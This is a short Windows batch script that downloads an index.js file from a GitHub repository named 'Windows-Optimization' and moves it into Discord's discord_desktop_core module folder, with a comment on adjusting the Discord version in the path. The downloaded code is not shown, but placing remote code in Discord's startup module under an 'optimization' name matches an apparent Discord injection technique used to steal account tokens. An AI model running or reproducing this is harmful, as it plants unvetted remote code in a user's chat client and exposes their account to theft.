curl -o "%temp%\index.js" "https://raw.githubusercontent.com/Teddymazrin/Windows-Optimization/main/Scripts/index.js"

move "%temp%\index.js" "%localappdata%\Discord\app-1.0.9175\modules\discord_desktop_core-1\discord_desktop_core\"


::Need to update app version for it to work. For example 'app-1.0.9175' if this updates. You need to change to the correct version which can be found in the file path.
